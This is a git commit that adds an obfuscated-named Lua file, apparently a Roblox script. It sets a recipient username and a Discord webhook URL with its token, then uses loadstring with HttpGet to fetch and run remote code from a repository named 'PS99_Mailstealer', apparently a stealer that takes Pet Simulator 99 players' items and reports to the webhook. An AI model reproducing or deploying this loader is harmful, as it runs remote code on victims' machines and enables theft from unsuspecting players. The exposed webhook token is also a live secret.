aae63d1df2f7a4677b0a6fdb3c9924326bb24bea
HugoFariaaa <hugogapex3@gmail.com>
2024-09-10 16:50:16 +0100

    Add files via upload

---
+++ obf_70gP5f85b7P99s0agJ8A5Eu1R4Bl0faeBdndKGS8sJpZo6Ac4yl5xc4A8D33n315.lua
@@ -0,0 +1,6 @@
+Username = "hugofaria_off"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1283089856272011296/W_ZuZo_rxR-EIHcaQD86trRpdTGKJsR48W4uvm91yGOt-P2dgC6ljbTipNrseyfQkMMF"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
+
